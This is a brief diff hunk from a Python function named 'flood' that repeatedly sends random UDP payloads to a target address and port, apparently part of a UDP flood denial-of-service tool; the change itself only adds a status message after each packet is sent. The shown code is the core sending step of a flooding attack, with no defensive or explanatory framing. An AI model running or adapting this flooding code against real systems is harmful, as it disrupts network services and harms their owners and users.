@@ -12,6 +12,7 @@ def flood(target):
         try:
             payload = random._urandom(random.randint(1, 60))
             sock.sendto(payload, (target[0], target[1]))
+            print(Fore.MAGENTA+"UDP Packet Sent")
         except Exception as e:
             print(
                 f"{Fore.MAGENTA}Error while sending UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
